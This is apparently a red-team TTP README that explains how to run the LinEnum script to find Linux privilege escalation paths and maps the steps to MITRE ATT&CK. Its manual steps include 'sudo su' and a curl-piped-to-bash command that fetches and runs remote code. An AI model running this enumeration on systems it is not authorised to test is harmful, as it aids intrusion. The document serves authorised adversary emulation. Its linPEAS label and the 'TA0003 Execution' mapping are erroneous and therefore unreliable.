# Identify Privilege Escalation Paths with linEnum

![Meta TTP](https://img.shields.io/badge/Meta_TTP-blue)

This TTP helps identify privilege escalation paths using linEnum, a tool that automates the discovery of local privilege escalation vulnerabilities on Linux-based operating systems.

## Arguments

- **escalate_privileges**: A boolean flag indicating whether to run the TTP as root or not. Default is false.
- **download_link**: The URL to download the latest version of linPEAS from GitHub. Default is [https://raw.githubusercontent.com/rebootuser/LinEnum/65475312171107e9373dd8b06c9757610f0653d8/LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/65475312171107e9373dd8b06c9757610f0653d8/LinEnum.sh)

## Pre-requisites

1. A Linux-based operating system.
2. Bash shell.

## Examples

You can run the TTP using the following example (after updating the arguments):
```bash
ttpforge run forgearmory//privilege-escalation/linux/identify-privilege-escalation-paths-with-linenum/identify-privilege-escalation-paths-with-linenum.yaml \
  --arg escalate_privileges=true
```

## Steps

1. **ensure-root-user-if-required**: This step checks if the TTP needs to be run as root and ensures that it is being executed as the root user.
2. **download-and-run-linenum**: This step downloads the latest version of linEnum from GitHub and executes it with bash.

## Manual Reproduction Steps

```
# Escalate privileges to root (optional - being root gives you more info)
sudo su

# Download and run LinEnum
curl -sL https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

## MITRE ATT&CK Mapping

- **Tactics**:
  - TA0003 Execution
  - TA0007 Discovery
- **Techniques**:
  - T1059 Command and Scripting Interpreter
  - T1087 Account Discovery
  - T1083 File and Directory Discovery
  - T1057 Process Discovery
  - T1069 Permission Groups Discovery
  - T1518 Software Discovery
  - T1082 System Information Discovery
  - T1033 System Owner/User Discovery
  - T1007 System Service Discovery
- **Subtechniques**:
  - T1059.004 Command and Scripting Interpreter Unix Shell
